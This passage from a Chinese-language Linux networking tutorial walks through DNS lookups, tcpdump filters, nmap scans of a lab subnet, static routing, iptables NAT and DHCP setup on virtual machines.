DNS的解析流程linux上的dns相关命令: # 下面这几个指令都可以查看DNS解析信息 dig dig @180.76.76.76 www.hc39.com nslookup nslookup www.hc39.com 180.76.76.76 host host www.baigui.cloud 114.114.114.114 ping www.baidu.com# 示例1：通过nslookup可以查询 yum provides nslookup # 查找之前可以先清除一下yum的缓存，yum clean all yum install bind-utils -y [root@localhost ~]# nslookup www.hc39.com Server: 192.168.61.2 Address: 192.168.61.2#53 # 53：表示DNS服务程序的端口为53端口 Non-authoritative answer: Name: www.hc39.com Address: 8.210.129.63 [root@localhost ~]# nslookup www.hc39.com 223.5.5.5 Server: 223.5.5.5 Address: 223.5.5.5#53 Non-authoritative answer: Name: www.hc39.com Address: 8.210.129.63 [root@localhost ~]# nslookup www.hc39.com 180.76.76.76 Server: 180.76.76.76 Address: 180.76.76.76#53 Non-authoritative answer: Name: www.hc39.com Address: 8.210.129.63 # 通过上面各个DNS服务器的查询结果都是一样的 其实我们上面使用的这些DNS服务器都只是DNS代理服务器，并不是最根儿上的DNS服务器 3.5.3 DNS查找顺序## 1、找本机的hosts文件 Windows host文件路径： C:\\WINDOWS\\system32\\drivers\\etc\\hosts ,hosts文件以静态映射的方式提供IP地址与主机名的对照表。 ### 2、浏览器缓存： 浏览器会按照一定的频率缓存DNS记录。浏览器地址栏输入chrome://net\u0002internals/#dns，就可以查看chormeDNS缓存。 ## 3、操作系统缓存： 如果浏览器缓存中找不到需要的DNS记录，那就去操作系统中找。cmd命令ipconfig /displaydns 用于查看操作系统dns缓存。ipconfig /flushdns刷新缓存，之前的记录就没了，只剩下一些固定的了。## 4、路由缓存： 路由器也有DNS缓存。## 5、去DNS本地服务器查找，自己公司搭建的或者阿里DNS服务器、百度DNS服务器等等## 6、去根域名服务器上找，全世界有13台根域名服务器，其实我们的网址，比如www.hc39.com后面都有个点.，这个.代表根域名的意思，我们可以nslookup www.hc39.com. 发现还是可以查询到的，只不过这个.默认省略掉了。## 7、根域名查不到的话，会直接下发本次请求给本地DNS服务器，并且把.com的顶级域名服务器地址发送给它，DNS服务器再向.com顶级域名服务器来进行查询。.com\\.cn\\.cloud等都是顶级域名服务器。## 8、如果.com找不到的话，.com顶级域名服务器会给本地DNS服务器下发请求，并且给它hc39.com域名服务器的地址，意思就是说hc39这个域名下放给hc39这个域名所属公司的DNS服务器了，那么就去hc39.com域名服务器进行查询### 9、查找到之后再还给你的电脑，你的电脑本地和路由器等都会自动缓存这些记录，下次再访问这个网站的时候，就从缓存中找，不然每次都按照流程找一遍就太慢了。 3.5.4 DNS记录的类型我在我的阿里云的域名位置给大家看一下，大家可以在阿里云或者腾讯云买个域名，但是域名备案要几个月才能下来，所在暂时不用买了，大家学习一下即可，买了域名还在买个ECS主机，会默认给一个公网ip，我们通过域名解析到这个公网ip就可以通过域名来访问这个主机了，为了方便演示，我在我的ECS 主机上的centos7.8系统上安装并启动了nginx，并且在ECS的安全组策略中添加了80端口的入栈规则， 然后访问80端口可以看到如下效果： 如下，输入www.wulaoban.top，即可访问： 这就配置好了域名和ip的对应关系，也就是我们说的DNS记录，这是个A记录。 做DNS记录的时候，我们看到有多种类型，那么我们来说一下这些类型。 类型有这么多，这些都是DNS记录类型，重点了解如下几个即可： ## A记录：域名对应一个ipv4的地址，通过dns查询这个域名就能得到对应ip地址 例如：www.wulaoban.top -- 39.105.145.132## CNAME：也叫做域名别名，它将域名指向另外一个域名，你通过这个域名来进行DNS查询，那么得到的是另外一个域名，DNS查询会基于询问另外一个域名。 比如dig www.qq.com就能看到CNAME记录## MX：邮件记录，我们发邮件给1111@qq.com这个地址，那么首先会去找qq的邮箱服务器，就需要用到这个记录来找到服务器。windows上也自带nslookup指令，查询a记录：nslookup -qt=a qq.com，查询mx记录：nslookup -qt=mx qq.com，会看到几个域名，ping域名就看到ip地址了。qq.com有mx记录，说明qq这个公司有自己的邮箱。如果某个公司没有自己的邮箱服务器，那么查不到信息。## NS：全称nameserver，可以指定DNS解析服务器的地址，在我们自己的域名解析记录上也可以设置自己DNS解析服务器，但是需要搭建DNS服务才行。## AAAA：ipv6地址，没啥说的。 nslookup查询示例：C:\\Users\\ls198nslookup -qt=a qq.com DNS request timed out. timeout was 2 seconds. 服务器: UnKnown Address: 192.168.2.1 非权威应答: 名称: qq.com Addresses: 61.129.7.47 183.3.226.35 123.151.137.18 C:\\Users\\ls198nslookup -qt=mx qq.com DNS request timed out. timeout was 2 seconds. 服务器: UnKnown Address: 192.168.2.1 非权威应答: qq.com MX preference = 10, mail exchanger = mx3.qq.com qq.com MX preference = 30, mail exchanger = mx1.qq.com qq.com MX preference = 20, mail exchanger = mx2.qq.com C:\\Users\\ls198ping mx1.qq.com 正在 Ping mx1.qq.com [113.96.208.206] 具有 32 字节的数据: 来自 113.96.208.206 的回复: 字节=32 时间=49ms TTL=53 来自 113.96.208.206 的回复: 字节=32 时间=47ms TTL=53 来自 113.96.208.206 的回复: 字节=32 时间=49ms TTL=53 来自 113.96.208.206 的回复: 字节=32 时间=48ms TTL=53 113.96.208.206 的 Ping 统计信息: 数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)， 往返行程的估计时间(以毫秒为单位): 最短 = 47ms，最长 = 49ms，平均 = 48ms C:\\Users\\ls198nslookup -qt=mx wulaoban.top # 没有邮箱地址 服务器: UnKnown Address: 192.168.2.1 wulaoban.top primary name server = dns19.hichina.com responsible mail addr = hostmaster.hichina.com serial = 2022052002 refresh = 3600 (1 hour) retry = 1200 (20 mins) expire = 86400 (1 day) default TTL = 600 (10 mins) C:\\Users\\ls198nslookup -qt=AAAA aliyun.com DNS request timed out. timeout was 2 seconds. 服务器: UnKnown Address: 192.168.2.1 非权威应答: 名称: aliyun.com Addresses: 2401:b180:1:60::5 2401:b180:1:60::6 3.6 域名 一是国家和地区顶级域名（country code top-level domains，简称ccTLDs），目前200多个国家都按照ISO3166国家代码分配了顶级域名，例如中国是cn，日本是jp等； 二是国际顶级域名（generic top-level domains，简称gTLDs），例如表示工商企业的 .com域名，表示网络提供商的 .net域名，表示非盈利组织的 .org域名等； 三是新顶级域名（New Generic Top-level Domain，简称New gTLD）如通用的.xyz域名、代表“高端”的.top域名、代表“红色”的.red域名、代表“人”的.men域名等一千多种。 从技术角度来看，一个完整的域名由顶级域名和下级域名构成，各部分之间用“.”隔开，最后一个“.”的右边被称为顶级域名（TLD，也称为一级域名），“.”左边的部分被称为二级域名，二级域名的左边是三级域名，以此类推。 为了便于理解和交流，我们通常会把域名分为前缀+后缀，后缀一般就是我们常见的.com/.cn/.cc/.net等等，这些都属于顶级域名，前缀则是由数字、字母自由组成的，用以和其他域名相区分的部分，这部分也是域名的核心价值所在。举个例子，中科三方的官网为http://www.sfn.cn，这其中.cn为顶级域名，也就是人们常说的后缀部分，.sfn则是其前缀的二级域名部分，代表的是中科三方这个品牌，最前面的.www则是前缀的三级域名部分，代表的是中科三方的官网。 二级域名的拥有者可以任意定义三级及三级以上的域名，比如小米公司花费两千万买下的http://mi.com这个二级域名后，他就可以根据其产品和业务再这个二级域名基础上无限定义三级域名或更高级的域名，比如，小米云服务：http://i.mi.com，小爱开放平台：http://xiaoai.mi.com，小米iot开发者平台：http://iot.mi.com，小米金融：http://jr.mi.com等等。一般情况下，除了政府相关网站外，很少有 企业去定义三级以上的域名。 3.7 ARP协议ARP（Address Resolution Protocol），工作在网络层和数据链路层中间。osi七层模型中，属于数据链路基层的。 作用：把ip地址解析成mac地址 arp要注意的## a：arp欺骗，广播的时候计算机默认是诚实的，但是如果它不诚实就可以做欺骗。## b：如果局域网规模太大，广播风暴 3.8 tcpdump抓包tcpdump是linux上的一个轻量级的抓包工具。支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助你去掉无用的信息。tcpdump只能抓取流经本机的数据包，一般有三个类型，比如指定地址，指定协议，或者指定网卡。 先给我们的虚拟机安装个nginx，然后拍个快照吧，方便一些 yum install epel-release -yyum install nginx -ysystemctl stop firewalldsystemctl disable firewalld## 启动nginx： /usr/sbin/nginx 简单使用： [root@localhost ~]# tcpdump# 默认情况下，直接启动tcpdump将监视第一个网络接口(非lo口)上所有流通的数据包，这样抓取的结果会非常多，而且默认不会显示出来。[root@localhost ~]# ifconfig # 先查看网卡名称，因为tcpdump抓包的时候和wireshark一样要指定网卡 ens33: flags=4163UP,BROADCAST,RUNNING,MULTICAST mtu 1500# 指定网卡抓取数据包，会将流经这个网卡的数据包全部抓取下来，这样也是太多了，尤其是我们如果是在xshell上执行这个指令的话，就会看到更多的数据包，刷屏的感觉，是因为xshell是远程连接执行指令，结果要返回给xshell，都是要经过网卡的。[root@localhost ~]# tcpdump -i ens33 # 指定网卡名称# 所以我们用xshell连接来抓包的时候，最好指定端口，比如不抓22端口的，我们抓一下80端口的。[root@localhost ~]# tcpdump -i ens33 port 80# 访问：http://192.168.61.139/ 就看到抓取的数据包了# 将抓取到的数据包保存到pcap\\cap文件中，cap是captured的简写，捕获的意思。[root@localhost ~]# tcpdump -i ens33 port 80 -w jaden.pcap # 屏幕上不显示，也不暂定，我们ctrl+c停止，然后看到目录下就有文件了[root@localhost ~]# ls anaconda-ks.cfg jaden.pcap # 把jaden.pcap放到我们的物理机，通过wireshark打开来进行查看分析# -nn参数# 不加-nn，抓包显示为：20:38:16.924940 IP 192.168.61.1.62552 localhost.localdomain.http: Flags... # 主机名和协议# 加了-nn，抓包显示为：21:49:01.908068 IP 192.168.61.1.49721 192.168.61.139.80: Flags # 主机ip地址和端口号[root@localhost ~]# tcpdump -i ens33 port 80 -nn# [root@localhost ~]# tcpdump -i ens33 port 80 -nn -c 20 #抓取到20个包之后自动停止# [root@localhost ~]# tcpdump -i ens33 port 80 -nn -c 20 -S #-S将seq\\ack等随机值显示完整# 指定协议：# [root@localhost ~]# tcpdump -i ens33 tcp port 80 -nn -c 20 ## -i 指定网卡的名称## -nn 不把端口解析成应用层协议## -c 指定抓包的数量## -S 不把随机序列和确认序列解析成绝对值## -w 指定数据包保存的位置 tcpdump 常用示例 tcpdump只能抓取流经本机的数据包，一般有三个类型，比如指定地址，指定协议，或者指定网卡。 3.8.1，综合实例// 网卡、host、协议tcp/udp、显示格式/保存文件tcpdump -i eth0 host 10.1.36.95 and port 7779 -w test.pcaptcpdump -i any src host 192.168.5.100 and port 7777 -nnAtcpdump -i any dst host 192.168.5.100 and port 7777 -nnA\ttcpdump -i any udp and port 6662 -nnA //ASCII显示(JSON格式可用)//16进制显示tcpdump -i any udp port 6005 -nn -xx//按length过滤tcpdump -i eth0 len = 500 -nnA\ttcpdump -i eth0 len = 1000 -nnA //ipv6tcpdump icmp6 -XXtcpdump ip6 proto 6tcpdump -i ens32 ip6 proto 6 -w server_ipv6.pcap 3.8.2 默认启动默认情况下，直接启动tcpdump将监视第一个网络接口(非lo口)上所有流通的数据包。这样抓取的结果会非常多，滚动非常快。 tcpdump 3.8.3, 过滤主机//抓取所有经过 eth0，目的或源地址是 192.168.1.70 的网络数据tcpdump -i eth0 host 192.168.1.70//抓取所有经过 eth0，源地址是 192.168.1.70 的网络数据tcpdump -i eth1 src host 192.168.1.70//抓取所有经过 eth0，目的地址是 192.168.1.70 的网络数据tcpdump -i eth1 dst host 192.168.1.70 3.8.4 过滤端口//抓取所有经过 eth0，目的或源端口是 22 的网络数据tcpdump -i eth0 port 22//抓取所有经过 eth0，源端口是 22 的网络数据tcpdump -i eth1 src port 22//抓取所有经过 eth0，目的端口是 22 的网络数据tcpdump -i eth1 dst port 22 3.8.5 过滤协议：tcpdump -i eth0 tcptcpdump -i eth0 udptcpdump -i eth0 iptcpdump -i eth0 icmptcpdump -i eth0 arp 3.8.6， 常用表达式：在tcpdump的过滤表达式中，各类关键字之间还能够通过布尔运算符来构成组合表达式，以满足实际运用时的需要。 取非(not 或!)、和运算符(and或)、或运算符(or或||)， //抓取所有经过 eth0，目的地址是 192.168.1.254 或 192.168.1.200 端口是 80 的 TCP 数据tcpdump -i eth0 ((tcp) and (port 80) and ((dst host 192.168.1.254) or (dst host 192.168.1.200)))//抓取所有经过 eth1，目标 MAC 地址是 00:01:02:03:04:05 的 ICMP 数据tcpdump -i eth1 ((icmp) and ((ether dst host 00:01:02:03:04:05)))//抓取所有经过 eth1，目的网络是 192.168，但目的主机不是 192.168.1.200 的 TCP 数据tcpdump -i eth1 ((tcp) and ((dst net 192.168) and (not dst host 192.168.1.200))) 3.8.7 保存到指定文件：//实时抓取3721端口，多播地址为228.228.228.228的包，然后写入228.228.228.228.pcap,然后通过Wireshark分析数据tcpdump -i any (host 228.228.228.228 port 3721) -w 228.228.228.228.pcap//实时抓取端口号8000的GET包，然后写入GET.logtcpdump -i eth0 ((port 8000) and (tcp[(tcp[12]2):4]=0x47455420)) -nnAl -w /tmp/GET.log 3.8.8 其他//抓取所有网卡的包tcpdump -i any//ARP过滤，比如从指定的网络接口截获5个ARP数据包，并且不将网络地址转换成主机名tcpdump arp -i eth0 -c 5 -n//截获在主机“9.185.10.57”和主机“9.185.10.58”或“9.185.10.59”之间传递的数据包tcpdump host 9.185.10.57 and 9.185.10.58 or 9.185.10.59 //假如想要截获主机“9.185.10.57”和除主机“9.186.10.58”外任何其他主机之间通信的IP数据包，能够使用如下命令tcpdump ip host 9.185.10.57 and ! 9.185.10.58 //抓取回环网口的包：tcpdump -i lo//防止包截断：tcpdump -s0//以数字显示主机及端口：tcpdump -n 3.8.9 tcpdump选项// 抓包选项：-c：在捕获指定个数的数据包后退出。注意，是最终要获取这么多个包。例如，指定-c 10将获取10个包，但可能已经处理了100个包，只不过只有10个包是满足条件的包。-i：interface，指定监听的网络接口。若未指定该选项，将从系统接口列表中搜寻编号最小的已配置好的接口(不包括loopback接口，要抓取loopback接口使用tcpdump -i lo)， ：一旦找到第一个符合条件的接口，搜寻马上结束。可以使用’any’关键字表示所有网络接口。 -n：对地址以数字方式显式，否则显式为主机名，也就是说-n选项不做主机名解析（DNS查询）。-nn：除了-n的作用外，还把端口显示为数值，否则显示端口服务名。（以ip和port的方式显示来源主机和目的主机，而不是用主机名和服务）-N：不打印出host的域名部分。例如tcpdump将会打印’nic’而不是’nic.ddn.mil’。-P：指定要抓取的包是流入还是流出的包。可以给定的值为in、“out和inout”，默认为inout。-s len：设置tcpdump的数据包抓取长度为len，如果不设置默认将会是65535字节。对于要抓取的数据包较大时，长度设置不够可能会产生包截断，若出现包截断， ：输出行中会出现[|proto]的标志(proto实际会显示为协议名)。但是抓取len越长，包的处理时间越长，并且会减少tcpdump可缓存的数据包的数量， ：从而会导致数据包的丢失，所以在能抓取我们想要的包的前提下，抓取长度越小越好。// 输出选项：-e：输出的每行中都将包括数据链路层头部信息，例如源MAC和目标MAC。-q：快速打印输出。即打印很少的协议相关信息，从而输出行都比较简短。-X：输出包的头部数据，会以16进制和ASCII两种方式同时输出。-XX：输出包的头部数据，会以16进制和ASCII两种方式同时输出，更详细。-v：输出较周详的信息，例如IP包中的TTL和服务类型信息。-vv：产生比-v更详细的输出。-vvv：产生比-vv更详细的输出。// 功能性选项：-D：列出可用于抓包的接口。将会列出接口的数值编号和接口名，它们都可以用于-i后。-F：从指定的文档中读取过滤规则，忽略命令行中指定的其他过滤规则。-w：将截获的数据包直接写入指定的文档中，不对其进行分析和输出。可以同时配合-G time选项使得输出文件每time秒就自动切换到另一个文件。可通过-r选项载入这些文件以进行分析和打印。-r：从指定的文档中读取数据包(该文档一般通过-w选项产生)。使用-表示从标准输入中读取。// 其他：-a 将网络地址和广播地址转变成容易识别的名字-d 将已截获的数据包的代码以人容易理解的格式输出；-dd 将已截获的数据包的代码以C程式的格式输出；-ddd 将已截获的数据包的代码以十进制格式输出；-e 输出数据链路层的头部信息；-f 将internet地址以数字形式输出；-l 将标准输出变为行缓冲方式；-t 不输出时间戳；-T 将截获的数据包直接解释为指定类型的报文，现在支持的类型有cnfp、rpc、rtp、snmp、vat和wb。 3.9 网络工具3.9.1 nmap# centos7上安装nmap yum install nmap -y[root@localhost ~]# nmap -v # 默认安装的6.40，不是最新版本，yum经常是下载不了最新版的，有镜像更新延迟的问题 Starting Nmap 6.40 ( http://nmap.org ) at 2023-04-05 00:13 CST# 官网下载最新版本的rpm包，然后rpm安装即可 rpm -Uvh nmap-7.93-1.x86_64.rpm # -U表示升级，如果已经安装了低版本就用-Uvh，如果没有安装老版本，那么-ivh安装# 我已经给大家下载好了，在工具包里面# 简单使用：# 探测ip地址段哪些ip地址是存活的，也就是有主机在线并使用了哪些ip地址 [root@localhost ~]# nmap -sn 192.168.61.0/24# 探测主机哪些端口开放 [root@localhost ~]# nmap -sS 192.168.61.0/24 # ip地址段 [root@localhost ~]# nmap -sS 192.168.61.139 # 单个ip地址# 如果你的主机在公网上面，别人通过nmap直接就可以扫描你，如果发现有什么漏洞，直接就可以把你拿下。 3.9.2 traceroute和tracert## 这两个工具是进行路由追踪的，router是路由的意思，路由追踪的意思就是查看一下我们想访问某个网站到底会经历哪些设备地址的跳转。这个用的不是很多。## tracert是windows上自带的工具：C:\\Users\\ls198tracert -d nmap.org # 比如追踪一下nmap.org，这是国外的网站，所以数据包应该是出国了。通过最多 30 个跃点跟踪到 nmap.org [45.33.49.119] 的路由: 1 3 ms 109 ms 6 ms 192.168.2.1 # 路由 2 * 9 ms 4 ms 192.168.1.1 # 光猫 3 42 ms 51 ms 12 ms 10.29.0.1 # 电信局域网 4 * * * 请求超时。 5 * * 198 ms 27.129.33.225 # 廊坊电信网络机房等 6 * * * 请求超时。 7 * * * 请求超时。 8 * * 28 ms 202.97.54.14 # 天津电信 9 254 ms 197 ms 205 ms 202.97.59.106 # 天津电信10 * * * 请求超时。11 181 ms 181 ms 189 ms 154.54.5.101 # 美国 加利福尼亚州 圣何塞12 185 ms 190 ms 183 ms 154.54.3.138 # 美国 加利福尼亚州 圣何塞13 185 ms 190 ms 189 ms 38.142.11.154 # 美国 加利福尼亚州 圣何塞14 * * * 请求超时。15 187 ms 195 ms * 45.33.49.119 # 美国 加利福尼亚州 弗里蒙特16 1027 ms 565 ms 179 ms 45.33.49.119 # 美国 加利福尼亚州 弗里蒙特## 跟踪完成 ## traceroute是linux上的工具，需要安装一下# 安装[root@localhost ~]# yum provides traceroute[root@localhost ~]# yum install traceroute -y[root@localhost ~]# traceroute -n nmap.org# 这个工具不好用，总是查询超时，查不到数据 3.10 修改网卡设置3.10.1 vmvare虚拟机的三种网络模式 桥接模式(bridged)：也就是将虚拟机的虚拟网络适配器与主机的物理网络适配器进行交接，虚拟机中的虚拟网络适配器可通过主机中的物理网络适配器直接访问到外部网络。简而言之，这就好像在局域网中添加了一台新的、独立的计算机一样。因此，虚拟机也会占用局域网中的一个 IP 地址，并且可以和其他终端进行相互访问。桥接模式网络连接支持有线和无线主机网络适配器。如果你想把虚拟机当做一台完全独立的计算机看待，并且允许它和其他终端一样的进行网络通信，那么桥接模式通常是虚拟机访问网络的最简单途径。 NAT模式：是Network Address Translation的缩写，意即网络地址转换。NAT 模式也是 VMware 创建虚拟机的默认网络连接模式。使用NAT模式网络连接时，VMware会在主机上建立单独的专用网络，用以在主机和虚拟机之间相互通信。虚拟机向外部网络发送的请求数据 包裹，都会交由 NAT 网络适配器加上 特殊标记 并以主机的名义转发出去，外部网络返回的响应数据 包裹，也是先由主机接收，然后交由 NAT 网络适配器根据 特殊标记 进行识别并转发给对应的虚拟机，因此，虚拟机在外部网络中不必具有自己的IP地址。从外部网络来看，虚拟机和主机在共享一个IP地址，默认情况下，外部网络终端也无法访问到虚拟机。 仅主机模式(host-only)：是一种比 NAT 模式更加封闭的的网络连接模式，它将创建完全包含在主机中的专用网络。仅主机模式的虚拟网络适配器仅对主机可见，并在虚拟机和主机系统之间提供网络连接。相对于 NAT 模式而言，仅主机模式不具备 NAT 功能，因此在默认情况下，使用仅主机模式网络连接的虚拟机无法连接到Internet (在主机上安装合适的路由或代理软件，或者在 Windows 系统的主机上使用 Internet 连接共享功能，仍然可以让虚拟机连接到 Internet 或其他网络)。在同一台主机上可以创建多个仅主机模式的虚拟网络，如果多个虚拟机处于同一个仅主机模式网络中，那么它们之间是可以相互通信的；如果它们处于不同的仅主机模式网络，则默认情况下无法进行相互通信（可通过在它们之间设置路由器来实现相互通信）。 ## 仅主机模式下的虚拟机是不能上网的，单纯的是物理机的奴隶，同一个虚拟网络的仅主机模式的虚拟机之间是可以互相通信的。和主机可以通信吗？这个要看网段配置，如果虚拟机和主机在同一个网段是可以通信的，如果不是也不能通信，而且仅主机模式的虚拟机只能和本主机通信，不能和主机同一网络或者公网的其他主机通信。 给虚拟机设定网络模式的配置位置： NAT模式的网络信息： VMware –编辑–虚拟机网路编辑器： 3.10.2 给Linux配置静态IP开机查看ip，如下 两个网卡，两个ip地址 ## 在虚拟机设置里面可以添加网卡## NAT的ip地址：192.168.61.140## 桥接模式的ip地址：192.168.2.119 但是当我们查看网卡配置信息的时候，会发现配置文件只有ifcfg-ens33，如下 我们给ens36也弄个配置文件，需要复制一份ifcfg-ens33配置文件，然后改名为ifcfg-ens36。 然后修改ifcfg-ens33配置信息： 改为如下内容：配置文件路径etcsysconfignetwork-scriptsifcfg-ens33 #默认配置 TYPE=Ethernet # 类型：以太网，我们现在用的网络都是以太网，数据链路基层都是以太网协议，没有别的协议。1982年以太网统一 了链路层的协议. PROXY_METHOD=none # 代理方法，目前无用，删除 BROWSER_ONLY=no # 只允许浏览器使用，没用，删除 BOOTPROTO=dhcp # 获取ip地址的方法，目前是dhcp，改为static，静态指定ip地址。 DEFROUTE=yes # 默认路由，没用，删除 IPV4_FAILURE_FATAL=no # 从这一行开始开始，往下数6行，都删掉 IPV6INIT=yes IPV6_AUTOCONF=yes IPV6_DEFROUTE=yes IPV6_FAILURE_FATAL=no IPV6_ADDR_GEN_MODE=stable-privacy NAME=ens33 # 名字改为ens36 UUID=15723721-cab7-40f6-bcee-4789906f8661 # 这是唯一标识符，这个没用，删掉 DEVICE=ens33 ONBOOT=yes#修改后的配置 TYPE=Ethernet #以太网类型 BOOTPROTO=static #dhcp自动获取 none,static手动配置 NAME=ens33 #网络的名字 DEVICE=ens33 #网卡的名字 ONBOOT=yes #开机自启 IPADDR=192.168.61.150 #ip地址 NETMASK=255.255.255.0 #子网掩码 # 其实下面网卡和dns都可以不用配置，因为我有两块网卡，只要有一块网卡有了下面网卡等的配置即可。# GATEWAY=192.168.61.2 #网关# DNS1=223.5.5.5 #dns1# DNS2=180.76.76.76 #dns2 ip地址也不是随便指定的： linux上网络名字和网卡名字相同而已，没什么。 网关的ip地址，因为我们是虚拟机，要找这个虚拟机自己的网卡，看网卡信息中找到网关地址，因为我们第一块网卡是NAT模式的，所以要找VMnet8，如下 打开虚拟网络编辑器，如下 网关就是192.168.61.2。 我们在修改一下第二块网卡ens36的网络信息： #修改后的配置 TYPE=Ethernet #以太网类型 BOOTPROTO=static #dhcp自动获取 none,static手动配置 NAME=ens36 #网络的名字 DEVICE=ens36 #网卡的名字 ONBOOT=yes #开机自启 IPADDR=192.168.2.110 #ip地址 NETMASK=255.255.255.0 #子网掩码# 其实下面网卡和dns都可以不用配置，因为我有两块网卡，只要有一块网卡有了下面网卡等的配置即可。 GATEWAY=192.168.2.1 #网关 # 这个就看我们物理机的网关ip即可，不管有几块网卡，指定一个网关即可。 DNS1=223.5.5.5 #dns1 DNS2=180.76.76.76 #dns2 修改完配置文件，重启网络服务生效 systemctl restart network # 刚改为配置，重启可能会卡住一会，没事，肯定会生效systemctl stop NetworkManagersystemctl disable NetworkManager 3.10.3 上不了网的排查思路3-1 xshell连不上的原因## 有时候大家可能会下载一些安全卫士什么的，优化一下自己的系统，让系统更快一些，结果导致xshell连接不上了.## 检查网卡是否开启了 检查服务，DHCP是用来发放ip地址的，NAT是用来控制NAT模式虚拟机上网的。 还要检查如下几项 1.检查虚拟机的网络适配器，是否连接，是否为nat模式2.检查VMware Network Adapter VMnet8网卡是否处于禁用状态3.VMnet8网卡的ip地址是否和虚拟机同一个网段，有时候手动指定它的ip地址会写错4.检查虚拟机的ip是否有或者是否正常，linux上ip地址冲突，会导致后设置这个ip的主机拿不到这个ip地址 3-2 xshell能连，但是上不了网# 如果看到如下报错，多半是GATEWAY关键字名称写错了 [root@network02 ~]# ping baidu.com ping: baidu.com: 未知的名称或服务 [root@network02 ~]# ping 223.5.5.5 connect: 网络不可达#GATEWAY地址写错了，或者网关路由器挂了 [root@network02 ~]# ping 223.5.5.5 PING 223.5.5.5 (223.5.5.5) 56(84) bytes of data.#能ping通公网ip，ping不通域名，dns地址有问题 [root@network02 ~]# ping www.baidu.com#[root@network02 ~]# vim /etc/resolv.conf #这里可以直接修改DNS地址^C [root@network02 ~]# ping 223.5.5.5 PING 223.5.5.5 (223.5.5.5) 56(84) bytes of data. 64 bytes from 223.5.5.5: icmp_seq=1 ttl=128 time=14.4 ms 64 bytes from 223.5.5.5: icmp_seq=2 ttl=128 time=6.08 ms 3-3 物理机上不了网## 第一步：检查物理是否正常## 第二步：ping网关## 第三步: ping公网ip## 第四步：ping www.baidu.com## tracert -d www.qq.com## 第五步：ping 自己服务器 3.11 静态路由项目3.11.1 环境准备 下面我克隆出来了三个虚拟机，如下 物理网络就设置好了，接下来开机设置ip地址。为了演示出来效果，我们都不给这三台主机设置网关地址，只配ip地址和子网掩码。网关是优先级最低的静态路由。 test_01 test_02 第一块网卡： 第二块网卡 test_03 好，02可以ping通01和03. 通过01直接ping一下03，试试 ping不通，显示网络不可达。 现在看上去我们的主机是不能跨ip地址段进行互相访问的，我们设置一个路由规则就可以了。 3.11.2 设置静态路由规则直接arp广播就能访问到的叫做直连路由，如下 route -n 就能查看到，可以看到我们主机01想访问192.168.61.0 网段的主机都是直接可达的。 刚才我们使用主机01ping主机03看到报错，网络不可达，就是因为你ping03主机的ip地址时，主机01发现你要找的ip地址不在我这个网段，就会自动查找路由表的记录，上面就是路由表记录，看不到03主机所在网段的路由，所以报错，找不到。 给01主机配置静态路由： route add -net 172.16.1.0/24 gw 192.168.61.161# 添加一条静态路由，访问172.16.1.0这个网段，那么先跳到192.168.61.161这个网关上，通过它去访问，gw就是设置网关的意思，这里就是设置了一下路由的下一次跳转到哪里 如下 先ping一下02的第二块网卡的ip地址，也就是172那个网段的 可以ping通，看到02主机给我回复了数据包，这是因为02主机本身的路由表中就有我们01主机的ip地址段： 可以通过 tcpdump -i ens33 -nn 来查看一下数据包有没有到，其实数据包都没有到达03主机。因为02主机的ip地址并不是 172.16.1.13 ，所以数据包丢掉了。也就是说02主机其实并没有帮我们做转发，我们需要配置一下转发才行。 3.11.3 打开转发功能在02主机上打开转发功能： echo net.ipv4.ip_forward = 1 /etc/sysctl.confcat /etc/sysctl.confsysctl -p # 让配置生效 然后，我们在02主机上抓个包 然后再从01主机ping03主机，看效果 看到数据包到了02主机，02主机给做了转发到了 172.16.1.13 ，但是ping并没有收到回应的数据包。 这是因为03主机不知道该怎么回给01主机，看03的路由表： 在03主机上也加上一条静态路由规则 route add -net 192.168.61.0/24 gw 172.16.1.12 如下 再通过01主机ping一下03主机： 可以ping通了。 这就是通过我们虚拟机来模拟了一下静态路由规则的设定方式。 3.11.4 总结：1、手动配置ip2、克隆虚拟机3、添加静态路由规则 route add -net 172.16.1.0/24 gw 192.168.20.12 route add -net 192.168.20.0/24 gw 172.16.1.124、设置数据包转发 echo net.ipv4.ip_forward = 1 /etc/sysctl.conf sysctl -p 5、systemctl restart network #重启网卡服务就可以还原所有的静态路由，如果你配置错了，就可以重启一下 3.11.5 数据包发送原理mac地址只是为了相同网段的主机通信，ip地址是定位主机的。 我们抓包看一下，比如通过01主机ping一下03主机，在02主机上抓两块网卡的5个数据包包，然后放到01主机上去 在03主机上也抓5个数据包放到01主机上 xshell连接01主机，然后把文件都搞到物理机上，通过wireshark打开看一下，就看到mac地址的变化了。 wireshark打开数据包就看到的ip地址没有变化，一直是mac地址的变化。 Ethernet II, Src: VMware_1f:4e:73 (00:0c:29:1f:4e:73), Dst: VMware_01:0e:9c (00:0c:29:01:0e:9c)Ethernet II, Src: VMware_01:0e:a6 (00:0c:29:01:0e:a6), Dst: VMware_ca:8c:81 (00:0c:29:ca:8c:81)Ethernet II, Src: VMware_01:0e:a6 (00:0c:29:01:0e:a6), Dst: VMware_ca:8c:81 (00:0c:29:ca:8c:81) 3.12 使用iptables实现nat上网3.12.1 让主机上网刚才的示例中，我们的02主机其实现在只是做了一个数据包转发功能，但是并不能上网 但是当我添加一条路由规则，指向NAT模式的网关时，如下查看网关 如下配置路由规则 route add -net 0.0.0.0/0 gw 192.168.61.2 # 0.0.0.0/0表示所有网段所有ip地址 如下，可以ping通公网ip了 但是ping不同域名，因为DNS没有配置，可以配置个DNS vim /etc/resolv.conf 保存退出，再ping 域名也可以ping通了。 3.12.2 配置nat让其他主机上网比如想让03主机上网，我们需要两步，1、在02主机上配置NAT规则 2、将03主机的网关ip指向02主机 2-1 配置iptable的NAT规则iptables -t nat -F # 清空一下之前的规则iptables -t nat -A POSTROUTING -s 172.16.1.0/24 -j MASQUERADE # 配置NAT路由器-t nat ## 指定nat表-A POSTROUTING链 ## 数据包离开的时候，做修改-s ## 源ip或者源ip段-j MASQUERADE ## 指定动作为，模拟路由器的外网ip 03主机上清空一下之前的路由规则 systemctl restart network 给03添加静态路由 route add -net 0.0.0.0/0 gw 172.16.1.12 给03主机添加一下DNS规则 vim /etc/resolv.confnameserver 223.5.5.5 然后再ping一下百度，如下 3.13 Linux的DHCP服务接下来让我们的linux主机更像一个路由器，一般路由器都具备dhcp服务，我们也可以给我们的linux主机配置上这个服务。 #1.安装dhcp yum install dhcp -y#2.修改dhcp服务端的配置文件 vim /etc/dhcp/dhcpd.conf#......subnet 172.16.1.0 netmask 255.255.255.0 range 172.16.1.100 172.16.1.250; option 